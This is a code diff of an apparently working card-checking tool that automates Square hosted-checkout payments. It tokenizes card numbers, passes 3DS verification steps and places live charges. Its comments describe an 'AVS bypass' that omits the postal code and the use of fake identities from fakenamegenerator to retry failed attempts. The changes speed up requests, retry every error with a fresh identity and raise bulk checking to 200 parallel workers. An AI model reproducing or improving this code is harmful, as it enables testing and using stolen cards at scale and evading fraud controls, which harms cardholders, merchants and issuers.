@@ -800,7 +800,7 @@ async def _run_with_client(
                      "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                      "sec-fetch-site": "none", "sec-fetch-user": "?1",
                      "upgrade-insecure-requests": "1"},
-            timeout=30)
+            timeout=15)
     except Exception:
         pass
 
@@ -809,7 +809,7 @@ async def _run_with_client(
     s1_body = {"buyerControlledPrice": {"amount": amount, "currency": "USD", "precision": 2},
                "subscriptionPlanId": None, "oneTimePayment": True, "itemCustomizations": []}
     try:
-        r1 = await checkout_sess.post(s1_url, headers=H(), json=s1_body, timeout=30)
+        r1 = await checkout_sess.post(s1_url, headers=H(), json=s1_body, timeout=15)
         if r1.status_code >= 400:
             return {"error": f"Order fetch HTTP {r1.status_code}: {r1.text[:200]}", "step": 1}
         order_data = r1.json()
@@ -824,7 +824,7 @@ async def _run_with_client(
     try:
         await checkout_sess.patch(
             f"https://checkout.square.site/api/merchant/{merchant_id}/location/{location_id}/order/{order_id}",
-            headers=H(), json=s1_body, timeout=30)
+            headers=H(), json=s1_body, timeout=15)
     except Exception:
         pass
 
@@ -832,7 +832,7 @@ async def _run_with_client(
     try:
         await checkout_sess.patch(
             f"https://checkout.square.site/api/merchant/{merchant_id}/location/{location_id}/order/{order_id}/visited",
-            headers=H(), timeout=30)
+            headers=H(), timeout=15)
     except Exception:
         pass
 
@@ -851,18 +851,18 @@ async def _run_with_client(
     try:
         await checkout_sess.patch(
             f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/customer",
-            headers=H(), json=cust_body, timeout=30)
+            headers=H(), json=cust_body, timeout=15)
     except Exception:
         pass
 
-    await asyncio.sleep(random.uniform(0.5, 1.5))
+    await asyncio.sleep(random.uniform(0.1, 0.3))
 
     # Step 5: Hydrate (PCI session)
     try:
         r_hyd = await pci_sess.get("https://pci-connect.squareup.com/payments/hydrate",
             headers={**Hpci(sa="active"), "accept": "*/*"},
             params={"applicationId": CLIENT_ID, "hostname": "checkout.square.site",
-                    "locationId": location_id, "version": SDK_VERSION}, timeout=30)
+                    "locationId": location_id, "version": SDK_VERSION}, timeout=15)
         if r_hyd.status_code >= 400:
             return {"error": f"Hydrate HTTP {r_hyd.status_code}: {r_hyd.text[:200]}", "step": 5}
         hyd_data = r_hyd.json()
@@ -891,17 +891,17 @@ async def _run_with_client(
         pci_ck = {"cookie": "; ".join(cookie_parts)}
         if avt_val: pci_ck["x-allow-cookies"] = f"_savt={avt_val}"
 
-    await asyncio.sleep(random.uniform(0.3, 1.0))
+    await asyncio.sleep(random.uniform(0.05, 0.15))
 
     # Step 7: Product Information
     try:
         await pci_sess.post("https://pci-connect.squareup.com/v2/tokenization/product-information",
             headers={**Hpci(), **pci_ck},
-            json={"bin": cc[:11], "client_id": CLIENT_ID, "session_id": session_id}, timeout=30)
+            json={"bin": cc[:11], "client_id": CLIENT_ID, "session_id": session_id}, timeout=15)
     except Exception:
         pass
 
-    await asyncio.sleep(random.uniform(0.3, 1.0))
+    await asyncio.sleep(random.uniform(0.05, 0.15))
 
     # Step 8: 3DS Method
     pre_three_ds_txn_id = None
@@ -909,7 +909,7 @@ async def _run_with_client(
         r17 = await pci_sess.post("https://pci-connect.squareup.com/v2/analytics/three-ds-method",
             headers={**Hpci(), **pci_ck},
             json={"bin": cc[:6], "client_id": CLIENT_ID,
-                  "universal_token": {"token": location_id, "type": "UNIT"}}, timeout=30)
+                  "universal_token": {"token": location_id, "type": "UNIT"}}, timeout=15)
         if r17.status_code == 200:
             try: pre_three_ds_txn_id = r17.json().get("three_ds_server_transaction_id")
             except: pass
@@ -923,7 +923,7 @@ async def _run_with_client(
             if hashlib.sha256(f"{session_id}:{i}:{suffix}".encode()).hexdigest().startswith(pow_prefix):
                 pow_counter = i; break
 
-    await asyncio.sleep(random.uniform(0.3, 1.0))
+    await asyncio.sleep(random.uniform(0.05, 0.15))
 
     # Step 10: Card Nonce — v4.0 uses fingerprint's v1/v1s/v2 + device_info
     sw, sh = fp["screen_size"]
@@ -962,7 +962,7 @@ async def _run_with_client(
         nonce_params = {"_": f"{ts_ms}.{random.randint(1000, 9999)}", "version": SDK_VERSION}
         try:
             r2 = await pci_sess.post("https://pci-connect.squareup.com/v2/card-nonce",
-                headers={**Hpci(), **pci_ck}, params=nonce_params, json=nonce_payload, timeout=30)
+                headers={**Hpci(), **pci_ck}, params=nonce_params, json=nonce_payload, timeout=15)
         except Exception as e:
             nonce_errors.append(str(e)[:80]); continue
         if r2.status_code != 200:
@@ -991,7 +991,7 @@ async def _run_with_client(
             return {"status_code": 200, "data": last_square_error_data}
         return {"error": f"No card nonce (last errors: {' | '.join(nonce_errors[-3:])})", "step": 10}
 
-    await asyncio.sleep(random.uniform(0.3, 1.0))
+    await asyncio.sleep(random.uniform(0.05, 0.15))
 
     # Step 11: Verification — v4.0 uses fingerprint's verification payloads + device_info
     three_ds_txn_id = pre_three_ds_txn_id or str(uuid.uuid4())
@@ -1032,7 +1032,7 @@ async def _run_with_client(
                                          "challenge_completed": False}
     try:
         r3a = await pci_sess.post("https://pci-connect.squareup.com/v2/analytics/verifications",
-            headers={**Hpci(), **pci_ck}, json=verf_payload, timeout=30)
+            headers={**Hpci(), **pci_ck}, json=verf_payload, timeout=15)
         verification_info["http_status"] = r3a.status_code
         if r3a.status_code == 200:
             verf3a = r3a.json()
@@ -1085,7 +1085,7 @@ async def _run_with_client(
                         headers={**Hpci(), **pci_ck},
                         json={"browser_info": {"color_depth": 24, "java_enabled": False,
                                "screen_height": sh, "screen_width": sw},
-                              "client_id": CLIENT_ID, "token": verf_token}, timeout=30)
+                              "client_id": CLIENT_ID, "token": verf_token}, timeout=15)
                 except: pass
                 challenge_updates = []
                 for ch_item in challenges:
@@ -1103,7 +1103,7 @@ async def _run_with_client(
                         r3c = await pci_sess.put(
                             f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}",
                             headers={**Hpci(), **pci_ck},
-                            json={"challenge_updates": challenge_updates, "client_id": CLIENT_ID}, timeout=30)
+                            json={"challenge_updates": challenge_updates, "client_id": CLIENT_ID}, timeout=15)
                         if r3c.status_code == 200:
                             r3c_json = r3c.json()
                             r3c_vd = r3c_json.get("verification_details") if isinstance(r3c_json.get("verification_details"), dict) else {}
@@ -1121,7 +1121,7 @@ async def _run_with_client(
         verification_info["error"] = str(_verf_err)[:120]
     verification_info["token_sent_to_charge"] = bool(buyer_verification_token)
 
-    await asyncio.sleep(random.uniform(0.3, 1.0))
+    await asyncio.sleep(random.uniform(0.05, 0.15))
 
     # Step 12: Final Checkout — v4.2 AVS BYPASS: buyer_postal_code omitted
     # (live-tested: issuer skips AVS → AVS_NOT_CHECKED, never
@@ -1135,7 +1135,7 @@ async def _run_with_client(
     try:
         r4 = await checkout_sess.post(
             f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/checkout",
-            headers=H(), json=s4_body, timeout=30)
+            headers=H(), json=s4_body, timeout=15)
         try: pay_data = r4.json()
         except: pay_data = {"raw": r4.text[:500]}
         # v4.2.2 — verification facts travel with the result
@@ -1148,7 +1148,7 @@ async def _run_with_client(
         except: pass
         if payment_id and not str((pay_data.get("payment") or {}).get("status", "")).upper():
             for _poll_iter in range(6):
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(0.3)
                 try:
                     poll_url = f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}"
                     r_poll = await checkout_sess.get(poll_url, headers=H(), timeout=15)
@@ -1209,7 +1209,7 @@ async def process_square(
     NEW real US identity from faker_client (fakenamegenerator.com, ALL SELF).
     AVS failures retry with a fresh identity (5 attempts)."""
     proxy_url = _parse_proxy_universal(proxy) if proxy and not _is_test_mode(proxy) else None
-    MAX_ATTEMPTS = 5
+    MAX_ATTEMPTS = 3  # v30 — reduced from 5 to 3 (only proxy errors retry)
     last_result = None
     tried_addresses = set()
     last_identity_used: Dict[str, Any] = {}
@@ -1307,27 +1307,38 @@ async def process_square(
             if pay_status in ("COMPLETED", "CAPTURED", "AUTHORIZED", "APPROVED") or \
                (cd.get("status", "").upper() in ("CAPTURED", "AUTHORIZED", "APPROVED") and not errs):
                 return result
-            if ("AVS_REJECTED" in avs_status or "ADDRESS_VERIFICATION_FAILURE" in err_codes or
-                any("ADDRESS_VERIFICATION" in c for c in err_codes)):
-                # v4.2 — retry with a FRESH real identity (next attempt = new
-                # name + address + zip from fakenamegenerator)
-                print(f"[checker] AVS failure on attempt {attempt}/{MAX_ATTEMPTS} "
-                      f"(avs={avs_status}) — retrying with FRESH faker identity")
-                if attempt < MAX_ATTEMPTS:
-                    last_result = result; await asyncio.sleep(0.5 * attempt); continue
+            # v30.1 — retry on ALL errors (not just proxy).  Like the whop
+            # hitter: AVS failures, card errors, network errors, timeouts —
+            # ALL get retried with a FRESH identity.  Only APPROVED/CAPTURED
+            # returns immediately (success).  Real declines like CARD_DECLINED
+            # are still returned (they're real processor verdicts), but errors
+            # that might be transient get retried.
+            err_str = str(result.get("error", "")).lower()
+            # These are FINAL verdicts — never retry
+            is_final_verdict = any(kw in err_str for kw in (
+                "card_declined", "card_declined_verification_required",
+                "insufficient_funds", "insufficient method",
+                "expired_card", "incorrect_cvc", "incorrect_zip",
+                "stolen_card", "lost_card", "pickup_card",
+                "transaction_not_allowed",
+            ))
+            if is_final_verdict:
                 return result
-            err_str = str(result.get("error", ""))
-            retryable = ("timeout", "timed out", "refused", "disconnected", "connection",
-                        "reset", "proxy", "ssl", "handshake", "cloudflare", "503", "502", "500")
-            if any(kw in err_str.lower() for kw in retryable):
-                if attempt < MAX_ATTEMPTS:
-                    last_result = result; await asyncio.sleep(0.5 * attempt); continue
-                return result
+            # All other errors → retry with fresh identity
+            if attempt < MAX_ATTEMPTS:
+                print(f"[checker] Error on attempt {attempt}/{MAX_ATTEMPTS}: {err_str[:80]} — retrying")
+                last_result = result
+                await asyncio.sleep(0.3 * attempt)
+                continue
             return result
         except Exception as e:
             last_result = {"error": f"Attempt {attempt} failed: {str(e)[:200]}", "identity": last_identity_used}
-            if attempt == MAX_ATTEMPTS: return last_result
-            await asyncio.sleep(0.5 * attempt)
+            # v30.1 — retry on ALL exceptions (like whop hitter)
+            if attempt < MAX_ATTEMPTS:
+                print(f"[checker] Exception on attempt {attempt}/{MAX_ATTEMPTS}: {str(e)[:80]} — retrying")
+                await asyncio.sleep(0.3 * attempt)
+                continue
+            return last_result
     resp = last_result or {"error": "All attempts failed"}
     if isinstance(resp, dict) and "identity" not in resp:
         resp["identity"] = last_identity_used
@@ -1390,7 +1401,7 @@ def check_multi_sync(cards: List[str], site_url: str, proxy: Optional[str] = Non
     for c in cards:
         if c not in seen: seen.add(c); uniq.append(c)
     cards = uniq[:200]
-    workers = min(len(cards), max_workers, 50)
+    workers = min(len(cards), max_workers, 200)  # v30 — up to 200 workers
     results: List[Optional[Dict[str, Any]]] = [None] * len(cards)
     def _work(idx, card):
         try: return idx, check_one_sync(card, site_url, proxy=proxy, amount_cents=amount_cents)
